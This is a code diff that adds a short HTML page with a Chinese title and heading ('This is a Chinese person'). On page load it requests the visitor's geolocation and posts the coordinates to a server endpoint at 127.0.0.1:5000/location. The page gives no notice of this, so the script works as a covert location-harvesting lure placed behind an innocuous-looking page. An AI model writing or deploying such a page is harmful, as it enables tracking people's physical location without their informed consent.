@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>这是中国人</title>
+    <script>
+        function sendLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    fetch('http://127.0.0.1:5000/location', {
+
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude
+                        })
+                    });
+                });
+            } else {
+                alert("Geolocation is not supported by this browser.");
+            }
+        }
+    </script>
+</head>
+<body onload="sendLocation()">
+    <h2>这是中国人</h2>
+</body>
+</html>
